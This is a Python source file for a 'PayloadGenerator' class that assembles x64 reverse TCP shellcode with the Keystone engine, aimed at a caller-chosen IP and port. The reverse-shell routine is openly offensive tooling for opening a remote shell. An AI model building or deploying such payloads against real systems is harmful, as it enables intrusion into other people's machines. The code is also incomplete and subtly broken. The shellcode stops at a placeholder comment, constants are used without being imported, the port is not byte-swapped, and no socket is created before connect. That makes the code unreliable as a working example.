from keystone import Ks, KsError

class PayloadGenerator:
	def __init__(self, arch=KS_ARCH_X86, mode=KS_MODE_64):
		"""
		Initialize assembler engine
		:param arch: Keystone architecture constant
		:param mode: Keystone mode constant
		"""
		self.ks = Ks(arch, mode)
		
	def assemble(self, assembly_code):
		"""
		Convert assembly to shellcode
		:param assembly_code: Raw assembly string
		:return: Bytes object containing shellcode
		"""
		try:
			encoding, _ = self.ks.asm(assembly_code)
			return bytes(encoding)
		except KsError as e:
			print(f"Assembly error: {e}")
			return None

	def generate_reverse_tcp(self, ip, port):
		"""
		Generate reverse TCP shellcode for x64
		:param ip: Target IP (string)
		:param port: Target port (int)
		"""
		hex_ip = ''.join([f"{int(octet):02x}" for octet in ip.split('.')[::-1]])
		hex_port = f"{port:04x}"
		
		asm = f"""
			; x64 reverse TCP shell
			mov rax, 0x{hex_ip}{hex_port}0002
			push rax
			mov rsi, rsp
			xor rdx, rdx
			mov rdi, 2
			mov rax, 0x2a
			syscall
			; ... rest of shellcode ...
		"""
		return self.assemble(asm)